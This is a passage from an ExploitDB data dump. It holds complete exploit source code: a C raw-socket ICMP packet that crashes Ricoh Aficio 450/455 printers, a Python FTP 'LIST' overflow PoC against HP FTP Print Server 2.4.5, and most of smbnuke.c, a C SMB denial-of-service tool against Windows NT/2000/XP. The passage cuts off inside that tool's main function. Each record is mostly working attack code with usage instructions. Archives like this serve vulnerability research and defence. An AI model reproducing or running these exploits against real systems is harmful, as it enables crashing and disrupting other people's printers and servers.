Crash', u'platform': u'linux', u'author': u'Jobert Abma', u'cve': [], u'source': u'ExploitDB', u'date': u'2010-04-06T00:00:00+00:00', u'_id': 12095, u'type': u'dos', u'port': 0}

CVE: []
Description: Ricoh Aficio 450/455 PCL Printer - Remote ICMP Denial of Service
{u'code': u'source: http://www.securityfocus.com/bid/11932/info\r\n\r\nIt is reported that Ricoh 450/455 printers are susceptible to a remote denial of service vulnerability. This issue is due to a failure of the device to properly handle exceptional ICMP packets.\r\n\r\nRemote attackers may exploit this vulnerability to restart affected devices. Repeated packets may be utilized to sustain the condition, causing the device to repeatedly restart. Source addresses of the malicious ICMP packets may also be spoofed, reducing the likelihood of locating, or blocking access to the attacker.\r\n\r\nDue to code reuse among devices, it is likely that other printers are also affected.\r\n\r\n/*\r\n * RICOH Aficio 450/455 PCL 5e Printer ICMP DOS vulnerability Exploit.\r\n * DATE: 12.15.2004\r\n * Vuln Advisory : Hongzhen Zhou<felix__zhou _at_ hotmail _dot_ com>\r\n * Exploit Writer : x90c(Kyong Joo)@www.chollian.net/~jyj9782\r\n *\r\n * Testing -----------------------------------------------\r\n * root@testbed:~/raw# gcc -o rpcl_icmpdos rpcl_icmpdos.c\r\n * root@testbed:~/raw# ./rpcl_icmpdos\r\n * Usage: ./rpcl_icmpdos <victim>\r\n * root@testbed:~/raw# ./rpcl_icmpdos 192.168.2.4\r\n * exploit sent ok() = ..x-_-x..\r\n * root@testbed:~/raw#\r\n *\r\n */\r\n\r\n#include<sys/types.h>\r\n#include<sys/socket.h>\r\n#include<netinet/in.h>\r\n#include<arpa/inet.h>\r\n#include<linux/ip.h>\r\n#include<linux/icmp.h>\r\n\r\nunsigned short cksum(unsigned short *buf, int len);\r\n\r\nstruct icmp_packet{\r\n        struct icmphdr icmp;\r\n        struct iphdr inip;\r\n        unsigned char bigger[90];               // STEP1: Bigger Data(ICMP Header(8)+ inip(20) + 90(bigger data))\r\n} packet;\r\n\r\n\r\n/* ########################\r\n * #     Entry Point      #\r\n * ########################\r\n*/\r\n\r\nint main(int argc, char *argv[]){\r\nstruct sockaddr_in ca;\r\nint sockfd, ret;\r\n\r\nif(argc<2){\r\n        printf("Usage: %s <victim>\\n", argv[0]);\r\n        exit(-1);\r\n}\r\n\r\nsockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);\r\n\r\nmemset(&packet, 0, sizeof(packet));\r\n\r\npacket.icmp.type = 3;                           // STEP2: Destination Unreachable.\r\npacket.icmp.code = 1;\r\npacket.icmp.un.echo.id = getpid();\r\npacket.icmp.un.echo.sequence = 0;\r\n\r\npacket.inip.ihl = 5;\r\npacket.inip.version = 4;\r\npacket.inip.tot_len = htons(20);\r\npacket.inip.id = htons(9090);\r\npacket.inip.ttl = 90;\r\npacket.inip.protocol = IPPROTO_TCP;             // STEP3: IPPROTO_UDP also useable.\r\npacket.inip.saddr = inet_addr("127.0.0.1");\r\npacket.inip.daddr = inet_addr("127.0.0.1");\r\npacket.inip.check = (unsigned short) cksum((unsigned short *)&packet.inip, 20);\r\n\r\npacket.icmp.checksum = cksum((void *)&packet, sizeof(packet));\r\n\r\nmemset(&ca, 0, sizeof(ca));\r\nca.sin_family = AF_INET;\r\nca.sin_addr.s_addr = inet_addr(argv[1]);\r\n\r\n\r\nif((sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&ca, sizeof(ca))) == sizeof(packet))\r\n        printf("exploit sent ok() = ..x-_-x..\\n");\r\nelse\r\n        printf("exploit sent failed() = ..o^O^o..\\n");\r\n\r\n\r\nclose(sockfd);\r\n\r\n}\r\n\r\n\r\n/* ########################\r\n * #  Internet Checksum   #\r\n * ########################\r\n*/\r\n\r\nunsigned short cksum(unsigned short *buf, int len){\r\nregister unsigned long sum;\r\n\r\nfor(sum = 0; len > 0; len--) sum += *buf++;\r\nsum = (sum >> 16) + (sum & 0xffff);\r\nsum += (sum >> 16);\r\nreturn ~sum;\r\n}', u'description': u'Ricoh Aficio 450/455 PCL Printer - Remote ICMP Denial of Service', u'platform': u'hardware', u'author': u'Hongzhen Zhou', u'cve': [], u'source': u'ExploitDB', u'date': u'2004-12-14T00:00:00+00:00', u'_id': 24839, u'type': u'dos', u'port': 0}

CVE: []
Description: HP Printer FTP Print Server 2.4.5 - 'LIST'  Buffer Overflow
{u'code': u'source: http://www.securityfocus.com/bid/21666/info\r\n\r\n-HP Printers running FTP Print Server are prone to a buffer-overflow vulnerability. This issue occurs because the application fails to boundscheck user-supplied data before copying it into an insufficiently sized buffer. \r\n\r\nAn attacker can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial of service.\r\n\r\n#!/usr/bin/python\r\n\r\nimport sys\r\nfrom ftplib import FTP\r\n\r\nprint "Hewlett-Packard FTP Print Server Version 2.4.5 Buffer Overflow (POC)"\r\nprint "Copyright (c) Joxean Koret"\r\nprint\r\n\r\nif len(sys.argv) == 1:\r\n    print "Usage: %s <target>" % sys.argv[0]\r\n    sys.exit(0)\r\n\r\ntarget = sys.argv[1]\r\n\r\nprint "[+] Running attack against " + target\r\n\r\ntry:\r\n    ftp = FTP(target)\r\nexcept:\r\n    print "[!] Can\'t connect to target", target, ".", sys.exc_info()[1]\r\n    sys.exit(0)\r\ntry:\r\n    msg = ftp.login() # Login anonymously\r\n    print msg\r\nexcept:\r\n    print "[!] Error logging anonymously.",sys.exc_info()[1]\r\n    sys.exit(0)\r\n\r\nbuf = "./A"\r\niMax = 9\r\n\r\nfor i in range(iMax):\r\n    buf += buf\r\n\r\nprint "[+] Sending buffer of",len(buf[0:3000]),"byte(s) ... "\r\n\r\ntry:\r\n    print "[+] Please, note that sometimes your connection will not be dropped. "\r\n    ftp.retrlines("LIST " + buf[0:3000])\r\n    print "[!] Exploit doesn\'t work :("\r\n    print\r\n    sys.exit(0)\r\nexcept:\r\n    print "[+] Apparently exploit works. Verifying ... "\r\n    print sys.exc_info()[1]\r\n\r\nftp2 = FTP(target)\r\n\r\ntry:\r\n    msg = ftp2.login()\r\n    print "[!] No, it doesn\'t work :( "\r\n    print\r\n    print msg\r\n    sys.exit(0)\r\nexcept:\r\n    print "[+] Yes, it works."\r\n    print sys.exc_info()[1]', u'description': u"HP Printer FTP Print Server 2.4.5 - 'LIST'  Buffer Overflow", u'platform': u'hardware', u'author': u'Joxean Koret', u'cve': [], u'source': u'ExploitDB', u'date': u'2006-12-19T00:00:00+00:00', u'_id': 29297, u'type': u'dos', u'port': 0}

CVE: []
Description: Microsoft Windows XP/2000/NT 4.0 - Network Share Provider SMB Request Buffer Overflow (1)
{u'code': u'source: http://www.securityfocus.com/bid/5556/info\r\n\r\nMicrosoft Windows operating systems use the Server Message Block (SMB) protocol to support services such as file and printer sharing. A buffer overflow vulnerability has been reporting in the handling of some malformed SMB requests.\r\n\r\nAn attacker may send a malformed SMB request packet in order to exploit this condition. It has been reported possible to corrupt heap memory, leading to a crash of the underlying system.\r\n\r\nIt may prove possible to exploit this vulnerability to execute arbitrary code and gain local access to the vulnerable system. This possibility has not, however, been confirmed.\r\n\r\nReportedly, this vulnerability may be exploited both as an authenticated user, and with anonymous access to the service.\r\n\r\nIt has been reported, by "Fabio Pietrosanti \\(naif\\)" <naif@blackhats.it>, that disabling the NetBIOS Null Session will prevent exploitation of this vulnerablity. \r\n\r\n/*\r\n *   smbnuke.c -- Windows SMB Nuker (DoS) - Proof of concept\r\n *   Copyright (C) 2002  Frederic Deletang (df@phear.org)\r\n *\r\n *   This program is free software; you can redistribute it and/or\r\n *   modify it under the terms of the GNU General Public License\r\n *   as published by the Free Software Foundation; either version 2 of\r\n *   the License or (at your option) any later version.\r\n *\r\n *   This program is distributed in the hope that it will be\r\n *   useful, but WITHOUT ANY WARRANTY; without even the implied warranty\r\n *   of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\r\n *   GNU General Public License for more details.\r\n *\r\n *   You should have received a copy of the GNU General Public License\r\n *   along with this program; if not, write to the Free Software\r\n *   Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307\r\n *   USA\r\n */\r\n\r\n/* NOTE:\r\n * Compile this program using only GCC and no other compilers\r\n * (except if you think this one supports the __attribute__ (( packed )) attribute)\r\n * This program might not work on big-endian systems.\r\n * It has been successfully tested from the following plateforms:\r\n * \t- Linux 2.4.18 / i686\r\n * \t- FreeBSD 4.6.1-RELEASE-p10 / i386\r\n * Don\'t bother me if you can\'t get it to compile or work on Solaris using the SunWS compiler.\r\n *\r\n * Another thing: The word counts are hardcoded, careful if you hack the sources.\r\n */\r\n\r\n/* Copyright notice:\r\n * some parts of this source (only two functions, name_len and name_mangle)\r\n * has been taken from libsmb.  The rest, especially the structures has\r\n * been written by me.\r\n */\r\n\r\n#include <stdio.h>\r\n#include <unistd.h>\r\n#include <sys/types.h>\r\n#include <sys/socket.h>\r\n#include <netdb.h>\r\n#include <fcntl.h>\r\n#include <stdlib.h>\r\n#include <ctype.h>\r\n#include <assert.h>\r\n#include <string.h>\r\n#include <errno.h>\r\n#include <time.h>\r\n#include <netinet/in.h>\r\n#include <arpa/inet.h>\r\n#include <string.h>\r\n#include <sys/time.h>\r\n\r\n#define SESSION_REQUEST 0x81\r\n\r\n#define SESSION_MESSAGE 0x00\r\n\r\n#define SMB_NEGOTIATE_PROTOCOL 0x72\r\n#define SMB_SESSION_SETUP_ANDX 0x73\r\n#define SMB_TREE_CONNECT_ANDX 0x75\r\n#define SMB_COM_TRANSACTION 0x25\r\n\r\n#define bswap16(x) \\\r\n\t((((x) >> 8) & 0xff) | (((x) & 0xff) << 8))\r\n\r\ntypedef struct\r\n{\r\n  unsigned char server_component[4];\r\n  unsigned char command;\r\n  unsigned char error_class;\r\n  unsigned char reserved1;\r\n  uint16_t error_code;\r\n  uint8_t flags;\r\n  uint16_t flags2;\r\n  unsigned char reserved2[12];\r\n  uint16_t tree_id;\r\n  uint16_t proc_id;\r\n  uint16_t user_id;\r\n  uint16_t mpex_id;\r\n}\r\n__attribute__ ((packed)) smb_header;\r\n\r\ntypedef struct\r\n{\r\n  unsigned char type;\r\n  unsigned char flags;\r\n  unsigned short length;\r\n  unsigned char called[34];\r\n  unsigned char calling[34];\r\n}\r\n__attribute__ ((packed)) nbt_packet;\r\n\r\ntypedef struct\r\n{\r\n  /* wct: word count */\r\n  uint8_t wct;\r\n  unsigned char andx_command;\r\n  unsigned char reserved1;\r\n  uint16_t andx_offset;\r\n  uint16_t max_buffer;\r\n  uint16_t max_mpx_count;\r\n  uint16_t vc_number;\r\n  uint32_t session_key;\r\n  uint16_t ANSI_pwlen;\r\n  uint16_t UNI_pwlen;\r\n  unsigned char reserved2[4];\r\n  uint32_t capabilities;\r\n  /* bcc: byte count */\r\n  uint16_t bcc;\r\n}\r\n__attribute__ ((packed)) session_setup_andx_request;\r\n\r\ntypedef struct\r\n{\r\n  /* wct: word count */\r\n  uint8_t wct;\r\n  unsigned char andx_command;\r\n  unsigned char reserved1;\r\n  uint16_t andx_offset;\r\n  uint16_t flags;\r\n  uint16_t pwlen;\r\n  uint16_t bcc;\r\n}\r\n__attribute__ ((packed)) tree_connect_andx_request;\r\n\r\ntypedef struct\r\n{\r\n  /* wct: word count */\r\n  uint8_t wct;\r\n  uint16_t total_param_cnt;\r\n  uint16_t total_data_cnt;\r\n  uint16_t max_param_cnt;\r\n  uint16_t max_data_cnt;\r\n  uint8_t max_setup_cnt;\r\n  unsigned char reserved1;\r\n  uint16_t flags;\r\n  uint32_t timeout;\r\n  uint16_t reserved2;\r\n  uint16_t param_cnt;\r\n  uint16_t param_offset;\r\n  uint16_t data_cnt;\r\n  uint16_t data_offset;\r\n  uint8_t setup_count;\r\n  uint8_t reserved3;\r\n  /* bcc: byte count */\r\n  uint16_t bcc;\r\n}\r\n__attribute__ ((packed)) transaction_request;\r\n\r\ntypedef struct\r\n{\r\n  uint16_t function_code;\r\n  unsigned char param_descriptor[6];\r\n  unsigned char return_descriptor[7];\r\n  uint16_t detail_level;\r\n  uint16_t recv_buffer_len;\r\n}\r\n__attribute__ ((packed)) parameters;\r\n\r\n\r\ntypedef struct\r\n{\r\n  uint8_t format;\r\n  unsigned char *name;\r\n}\r\nt_dialects;\r\n\r\nt_dialects dialects[] = {\r\n  {2, "PC NETWORK PROGRAM 1.0"},\r\n  {2, "MICROSOFT NETWORKS 1.03"},\r\n  {2, "MICROSOFT NETWORKS 3.0"},\r\n  {2, "LANMAN1.0"},\r\n  {2, "LM1.2X002"},\r\n  {2, "Samba"},\r\n  {2, "NT LM 0.12"},\r\n  {2, "NT LANMAN 1.0"},\r\n  {0, NULL}\r\n};\r\n\r\nenum\r\n{\r\n  STATE_REQUESTING_SESSION_SETUP = 1,\r\n  STATE_NEGOTIATING_PROTOCOL,\r\n  STATE_REQUESTING_SESSION_SETUP_ANDX,\r\n  STATE_REQUESTING_TREE_CONNECT_ANDX,\r\n  STATE_REQUESTING_TRANSACTION\r\n}\r\nstatus;\r\n\r\nconst unsigned char *global_scope = NULL;\r\n\r\n/****************************************************************************\r\n * return the total storage length of a mangled name - from smbclient\r\n *\r\n ****************************************************************************/\r\n\r\nint\r\nname_len (char *s1)\r\n{\r\n  /* NOTE: this argument _must_ be unsigned */\r\n  unsigned char *s = (unsigned char *) s1;\r\n  int len;\r\n\r\n  /* If the two high bits of the byte are set, return 2. */\r\n  if (0xC0 == (*s & 0xC0))\r\n    return (2);\r\n\r\n  /* Add up the length bytes. */\r\n  for (len = 1; (*s); s += (*s) + 1)\r\n    {\r\n      len += *s + 1;\r\n      assert (len < 80);\r\n    }\r\n\r\n  return (len);\r\n}                               /* name_len */\r\n\r\n\r\n/****************************************************************************\r\n * mangle a name into netbios format - from smbclient \r\n *  Note:  <Out> must be (33 + strlen(scope) + 2) bytes long, at minimum.\r\n *\r\n ****************************************************************************/\r\n\r\nint\r\nname_mangle (char *In, char *Out, char name_type)\r\n{\r\n  int i;\r\n  int c;\r\n  int len;\r\n  char buf[20];\r\n  char *p = Out;\r\n\r\n  /* Safely copy the input string, In, into buf[]. */\r\n  (void) memset (buf, 0, 20);\r\n  if (strcmp (In, "*") == 0)\r\n    buf[0] = \'*\';\r\n  else\r\n    (void) snprintf (buf, sizeof (buf) - 1, "%-15.15s%c", In, name_type);\r\n\r\n  /* Place the length of the first field into the output buffer. */\r\n  p[0] = 32;\r\n  p++;\r\n\r\n  /* Now convert the name to the rfc1001/1002 format. */\r\n  for (i = 0; i < 16; i++)\r\n    {\r\n      c = toupper (buf[i]);\r\n      p[i * 2] = ((c >> 4) & 0x000F) + \'A\';\r\n      p[(i * 2) + 1] = (c & 0x000F) + \'A\';\r\n    }\r\n  p += 32;\r\n  p[0] = \'\\0\';\r\n\r\n  /* Add the scope string. */\r\n  for (i = 0, len = 0; NULL != global_scope; i++, len++)\r\n    {\r\n      switch (global_scope[i])\r\n        {\r\n        case \'\\0\':\r\n          p[0] = len;\r\n          if (len > 0)\r\n            p[len + 1] = 0;\r\n          return (name_len (Out));\r\n        case \'.\':\r\n          p[0] = len;\r\n          p += (len + 1);\r\n          len = -1;\r\n          break;\r\n        default:\r\n          p[len + 1] = global_scope[i];\r\n          break;\r\n        }\r\n    }\r\n\r\n  return (name_len (Out));\r\n\r\n}\r\n\r\nint\r\ntcp_connect (const char *rhost, unsigned short port)\r\n{\r\n  struct sockaddr_in dest;\r\n  struct hostent *host;\r\n  int fd;\r\n\r\n  host = gethostbyname (rhost);\r\n  if (host == NULL)\r\n    {\r\n      fprintf (stderr, "Could not resolve host: %s\\n", rhost);\r\n      return -1;\r\n    }\r\n\r\n  dest.sin_family = AF_INET;\r\n  dest.sin_addr.s_addr = *(long *) (host->h_addr);\r\n  dest.sin_port = htons (port);\r\n\r\n  fd = socket (AF_INET, SOCK_STREAM, 0);\r\n\r\n  if (connect (fd, (struct sockaddr *) &dest, sizeof (dest)) < 0)\r\n    {\r\n      fprintf (stderr, "Could not connect to %s:%d - %s\\n", rhost, port,\r\n               strerror (errno));\r\n      return -1;\r\n    }\r\n\r\n  return fd;\r\n}\r\n\r\nvoid\r\nbuild_smb_header (smb_header * hdr, uint8_t command, uint8_t flags,\r\n                  uint16_t flags2, uint16_t tree_id, uint16_t proc_id,\r\n                  uint16_t user_id, uint16_t mpex_id)\r\n{\r\n  memset (hdr, 0, sizeof (smb_header));\r\n\r\n  /* SMB Header MAGIC. */\r\n  hdr->server_component[0] = 0xff;\r\n  hdr->server_component[1] = \'S\';\r\n  hdr->server_component[2] = \'M\';\r\n  hdr->server_component[3] = \'B\';\r\n\r\n  hdr->command = command;\r\n\r\n  hdr->flags = flags;\r\n  hdr->flags2 = flags2;\r\n\r\n  hdr->tree_id = tree_id;\r\n  hdr->proc_id = proc_id;\r\n  hdr->user_id = user_id;\r\n  hdr->mpex_id = mpex_id;\r\n}\r\n\r\nunsigned char *\r\npush_string (unsigned char *stack, unsigned char *string)\r\n{\r\n  strcpy (stack, string);\r\n  return stack + strlen (stack) + 1;\r\n}\r\n\r\nvoid\r\nrequest_session_setup (int fd, char *netbios_name)\r\n{\r\n  nbt_packet pkt;\r\n\r\n  pkt.type = SESSION_REQUEST;\r\n  pkt.flags = 0x00;\r\n  pkt.length = bswap16 (sizeof (nbt_packet));\r\n  name_mangle (netbios_name, pkt.called, 0x20);\r\n  name_mangle ("", pkt.calling, 0x00);\r\n  write (fd, &pkt, sizeof (nbt_packet));\r\n\r\n}\r\n\r\nvoid\r\nnegotiate_protocol (unsigned char *buffer, int fd)\r\n{\r\n  smb_header hdr;\r\n  unsigned char *p;\r\n  uint16_t proc_id, mpex_id;\r\n  int i;\r\n\r\n  proc_id = (uint16_t) rand ();\r\n  mpex_id = (uint16_t) rand ();\r\n\r\n  buffer[0] = SESSION_MESSAGE;\r\n  buffer[1] = 0x0;\r\n\r\n  build_smb_header (&hdr, SMB_NEGOTIATE_PROTOCOL, 0, 0, 0, proc_id, 0,\r\n                    mpex_id);\r\n\r\n  memcpy (buffer + 4, &hdr, sizeof (smb_header));\r\n\r\n  p = buffer + 4 + sizeof (smb_header) + 3;\r\n\r\n  for (i = 0; dialects[i].name != NULL; i++)\r\n    {\r\n      *p = dialects[i].format;\r\n      strcpy (p + 1, dialects[i].name);\r\n      p += strlen (dialects[i].name) + 2;\r\n    }\r\n\r\n  /* Set the word count */\r\n  *(uint8_t *) (buffer + 4 + sizeof (smb_header)) = 0;\r\n\r\n  /* Set the byte count */\r\n  *(uint16_t *) (buffer + 4 + sizeof (smb_header) + 1) =\r\n    (uint16_t) (p - buffer - 4 - sizeof (smb_header) - 3);\r\n\r\n  *(uint16_t *) (buffer + 2) = bswap16 ((uint16_t) (p - buffer - 4));\r\n\r\n  write (fd, buffer, p - buffer);\r\n\r\n}\r\n\r\nvoid\r\nrequest_session_setup_andx (unsigned char *buffer, int fd)\r\n{\r\n  smb_header hdr;\r\n  session_setup_andx_request ssar;\r\n  uint16_t proc_id, mpex_id;\r\n  unsigned char *p;\r\n\r\n  proc_id = (uint16_t) rand ();\r\n  mpex_id = (uint16_t) rand ();\r\n\r\n  build_smb_header (&hdr, SMB_SESSION_SETUP_ANDX, 0x08, 0x0001, 0, proc_id, 0,\r\n                    mpex_id);\r\n\r\n  buffer[0] = SESSION_MESSAGE;\r\n  buffer[1] = 0x0;\r\n\r\n  memcpy (buffer + 4, &hdr, sizeof (smb_header));\r\n\r\n  p = buffer + 4 + sizeof (smb_header);\r\n\r\n  memset (&ssar, 0, sizeof (session_setup_andx_request));\r\n  ssar.wct = 13;\r\n  ssar.andx_command = 0xff;     /* No further commands */\r\n  ssar.max_buffer = 65535;\r\n  ssar.max_mpx_count = 2;\r\n  ssar.vc_number = 1025;\r\n\r\n  ssar.ANSI_pwlen = 1;\r\n\r\n  p = buffer + 4 + sizeof (smb_header) + sizeof (session_setup_andx_request);\r\n\r\n  /* Ansi password */\r\n  p = push_string (p, "");\r\n\r\n  /* Account */\r\n  p = push_string (p, "");\r\n\r\n  /* Primary domain */\r\n  p = push_string (p, "WORKGROUP");\r\n\r\n  /* Native OS */\r\n  p = push_string (p, "Unix");\r\n\r\n  /* Native Lan Manager */\r\n  p = push_string (p, "Samba");\r\n\r\n  ssar.bcc =\r\n    p - buffer - 4 - sizeof (smb_header) -\r\n    sizeof (session_setup_andx_request);\r\n\r\n  memcpy (buffer + 4 + sizeof (smb_header), &ssar,\r\n          sizeof (session_setup_andx_request));\r\n\r\n  /* Another byte count */\r\n  *(uint16_t *) (buffer + 2) =\r\n    bswap16 ((uint16_t)\r\n             (sizeof (session_setup_andx_request) + sizeof (smb_header) +\r\n              ssar.bcc));\r\n\r\n  write (fd, buffer,\r\n         sizeof (session_setup_andx_request) + sizeof (smb_header) + 4 +\r\n         ssar.bcc);\r\n}\r\n\r\nvoid\r\nrequest_tree_connect_andx (unsigned char *buffer, int fd,\r\n                           const char *netbios_name)\r\n{\r\n  smb_header hdr;\r\n  tree_connect_andx_request tcar;\r\n  uint16_t proc_id, user_id;\r\n  unsigned char *p, *q;\r\n\r\n  proc_id = (uint16_t) rand ();\r\n  user_id = ((smb_header *) (buffer + 4))->user_id;\r\n\r\n  build_smb_header (&hdr, SMB_TREE_CONNECT_ANDX, 0x18, 0x2001, 0, proc_id,\r\n                    user_id, 0);\r\n\r\n  buffer[0] = SESSION_MESSAGE;\r\n  buffer[1] = 0x0;\r\n\r\n  memcpy (buffer + 4, &hdr, sizeof (smb_header));\r\n\r\n  memset (&tcar, 0, sizeof (tree_connect_andx_request));\r\n\r\n  tcar.wct = 4;\r\n  tcar.andx_command = 0xff;     /* No further commands */\r\n  tcar.pwlen = 1;\r\n\r\n  p = buffer + 4 + sizeof (smb_header) + sizeof (tree_connect_andx_request);\r\n\r\n  /* Password */\r\n  p = push_string (p, "");\r\n\r\n  /* Path */\r\n  q = malloc (8 + strlen (netbios_name));\r\n\r\n  sprintf (q, "\\\\\\\\%s\\\\IPC$", netbios_name);\r\n  p = push_string (p, q);\r\n\r\n  free (q);\r\n\r\n  /* Service */\r\n  p = push_string (p, "IPC");\r\n\r\n  tcar.bcc =\r\n    p - buffer - 4 - sizeof (smb_header) - sizeof (tree_connect_andx_request);\r\n\r\n  memcpy (buffer + 4 + sizeof (smb_header), &tcar,\r\n          sizeof (tree_connect_andx_request));\r\n\r\n  /* Another byte count */\r\n  *(uint16_t *) (buffer + 2) =\r\n    bswap16 ((uint16_t)\r\n             (sizeof (tree_connect_andx_request) + sizeof (smb_header) +\r\n              tcar.bcc));\r\n\r\n  write (fd, buffer,\r\n         sizeof (tree_connect_andx_request) + sizeof (smb_header) + 4 +\r\n         tcar.bcc);\r\n}\r\n\r\nvoid\r\nrequest_transaction (unsigned char *buffer, int fd)\r\n{\r\n  smb_header hdr;\r\n  transaction_request transaction;\r\n  parameters params;\r\n  uint16_t proc_id, tree_id, user_id;\r\n  unsigned char *p;\r\n\r\n  proc_id = (uint16_t) rand ();\r\n  tree_id = ((smb_header *) (buffer + 4))->tree_id;\r\n  user_id = ((smb_header *) (buffer + 4))->user_id;\r\n\r\n  build_smb_header (&hdr, SMB_COM_TRANSACTION, 0, 0, tree_id, proc_id,\r\n                    user_id, 0);\r\n\r\n  buffer[0] = SESSION_MESSAGE;\r\n  buffer[1] = 0x0;\r\n\r\n  memcpy (buffer + 4, &hdr, sizeof (smb_header));\r\n\r\n  memset (&transaction, 0, sizeof (transaction_request));\r\n\r\n  transaction.wct = 14;\r\n  transaction.total_param_cnt = 19; /* Total lenght of parameters */\r\n  transaction.param_cnt = 19; /* Lenght of parameter */\r\n\r\n  p = buffer + 4 + sizeof (smb_header) + sizeof (transaction_request);\r\n\r\n  /* Transaction name */\r\n  p = push_string (p, "\\\\PIPE\\\\LANMAN");\r\n\r\n  transaction.param_offset = p - buffer - 4;\r\n\r\n  params.function_code = (uint16_t) 0x68;       /* NetServerEnum2 */\r\n  strcpy (params.param_descriptor, "WrLeh");    /* RAP_NetGroupEnum_REQ  */\r\n  strcpy (params.return_descriptor, "B13BWz");  /* RAP_SHARE_INFO_L1 */\r\n  params.detail_level = 1;\r\n  params.recv_buffer_len = 50000;\r\n\r\n  memcpy (p, &params, sizeof (parameters));\r\n\r\n  p += transaction.param_cnt;\r\n\r\n  transaction.data_offset = p - buffer - 4;\r\n\r\n  transaction.bcc =\r\n    p - buffer - 4 - sizeof (smb_header) - sizeof (transaction_request);\r\n\r\n  memcpy (buffer + 4 + sizeof (smb_header), &transaction,\r\n          sizeof (transaction_request));\r\n\r\n  /* Another byte count */\r\n  *(uint16_t *) (buffer + 2) =\r\n    bswap16 ((uint16_t)\r\n             (sizeof (transaction_request) + sizeof (smb_header) +\r\n              transaction.bcc));\r\n\r\n  write (fd, buffer,\r\n         sizeof (transaction_request) + sizeof (smb_header) + 4 +\r\n         transaction.bcc);\r\n}\r\n\r\ntypedef struct\r\n{\r\n  uint16_t transaction_id;\r\n  uint16_t flags;\r\n  uint16_t questions;\r\n  uint16_t answerRRs;\r\n  uint16_t authorityRRs;\r\n  uint16_t additionalRRs;\r\n\r\n  unsigned char query[32];\r\n  uint16_t name;\r\n  uint16_t type;\r\n  uint16_t class;\r\n}\r\n__attribute__ ((packed)) nbt_name_query;\r\n\r\ntypedef struct\r\n{\r\n  nbt_name_query answer;\r\n  uint32_t ttl;\r\n  uint16_t datalen;\r\n  uint8_t names;\r\n}\r\n__attribute__ ((packed)) nbt_name_query_answer;\r\n\r\nchar *\r\nlist_netbios_names (unsigned char *buffer, size_t size, const char *rhost,\r\n                    unsigned short port, unsigned int timeout)\r\n{\r\n  nbt_name_query query;\r\n  struct sockaddr_in dest;\r\n  struct hostent *host;\r\n  int fd, i;\r\n\r\n  fd_set rfds;\r\n  struct timeval tv;\r\n\r\n  printf ("Trying to list netbios names on %s\\n", rhost);\r\n\r\n  host = gethostbyname (rhost);\r\n  if (host == NULL)\r\n    {\r\n      fprintf (stderr, "Could not resolve host: %s\\n", rhost);\r\n      return NULL;\r\n    }\r\n\r\n  memset (&dest, 0, sizeof (struct sockaddr_in));\r\n\r\n  dest.sin_family = AF_INET;\r\n  dest.sin_addr.s_addr = *(long *) (host->h_addr);\r\n  dest.sin_port = htons (port);\r\n\r\n  if ((fd = socket (AF_INET, SOCK_DGRAM, 0)) < 0)\r\n    {\r\n      fprintf (stderr, "Could not setup the UDP socket: %s\\n",\r\n               strerror (errno));\r\n      return NULL;\r\n    }\r\n\r\n  memset (&query, 0, sizeof (nbt_name_query));\r\n\r\n  query.transaction_id = (uint16_t) bswap16 (0x1e);     //rand();\r\n  query.flags = bswap16 (0x0010);\r\n  query.questions = bswap16 (1);\r\n\r\n  name_mangle ("*", query.query, 0);\r\n  query.type = bswap16 (0x21);\r\n  query.class = bswap16 (0x01);\r\n\r\n  if (sendto\r\n      (fd, &query, sizeof (nbt_name_query), 0, (struct sockaddr *) &dest,\r\n       sizeof (struct sockaddr_in)) != sizeof (nbt_name_query))\r\n    {\r\n      fprintf (stderr, "Could not send UDP packet: %s\\n", strerror (errno));\r\n      return NULL;\r\n    }\r\n\r\n  /* Now, wait for an answer -- add a timeout to 10 seconds */\r\n\r\n  FD_ZERO (&rfds);\r\n  FD_SET (fd, &rfds);\r\n\r\n  tv.tv_sec = timeout;\r\n  tv.tv_usec = 0;\r\n\r\n  if (!select (fd + 1, &rfds, NULL, NULL, &tv))\r\n    {\r\n      fprintf (stderr,\r\n               "The udp read has reached the timeout - try setting the netbios name manually - exiting...\\n");\r\n      return NULL;\r\n    }\r\n\r\n  recvfrom (fd, buffer, size, 0, NULL, NULL);\r\n\r\n  for (i = 0; i < ((nbt_name_query_answer *) buffer)->names; i++)\r\n    if ((uint8_t) * (buffer + sizeof (nbt_name_query_answer) + 18 * i + 15) ==\r\n        0x20)\r\n      return buffer + sizeof (nbt_name_query_answer) + 18 * i;\r\n\r\n  printf ("No netbios name available for use - you probably won\'t be able to crash this host\\n");\r\n  printf ("However, you can try setting one manually\\n");\r\n  \r\n  return NULL;\r\n}\r\n\r\nchar *\r\nextract_name (const char *name)\r\n{\r\n  int i;\r\n  char *p = malloc(14);\r\n\r\n  for (i = 0; i < 14; i++)\r\n    if (name[i] == \' \')\r\n      break;\r\n     else\r\n      p[i] = name[i];\r\n\r\n  p[i] = \'\\0\';\r\n\r\n  return p;\r\n}\r\n\r\nvoid\r\nprint_banner (void)\r\n{\r\n  printf ("Windows SMB Nuker (DoS) - Proof of concept - CVE CAN-2002-0724\\n");\r\n  printf ("Copyright 2002 - Frederic Deletang (df@phear.org) - 28/08/2002\\n\\n");\r\n}\r\n\r\nint\r\nis_smb_header (const unsigned char *buffer, int len)\r\n{\r\n  if (len < sizeof (smb_header))\r\n    return 0;\r\n\r\n  if (buffer[0] == 0xff && buffer[1] == \'S\' && buffer[2] == \'M\'\r\n      && buffer[3] == \'B\')\r\n    return 1;\r\n  else\r\n    return 0;\r\n}\r\n\r\nint\r\nmain (int argc, char **argv)\r\n{\r\n  int fd, r, i, c;\r\n  unsigned char buffer[1024 * 4];       /* Enough. */\r\n  char *hostname = NULL, *name = NULL;\r\n\r\n  unsigned int showhelp = 0;\r\n\r\n  unsigned int packets = 10;\r\n  unsigned int state;\r\n\r\n  unsigned int udp_timeout = 10;\r\n  unsigned int tcp_timeout = 10;\r\n\r\n  unsigned short netbios_ssn_port = 139;\r\n  unsigned short netbios_ns_port = 137;\r\n\r\n  fd_set rfds;\r\n  struct timeval tv;\r\n\r\n  srand (time (NULL));\r\n\r\n  print_banner ();\r\n\r\n  while ((c = getopt (argc, argv, "N:n:p:P:t:T:h")) != -1)\r\n    {\r\n      switch (c)\r\n        {\r\n        case \'N\':\r\n          name = optarg;\r\n          break;\r\n        case \'n\':\r\n          packets = atoi (optarg);\r\n          break;\r\n        case 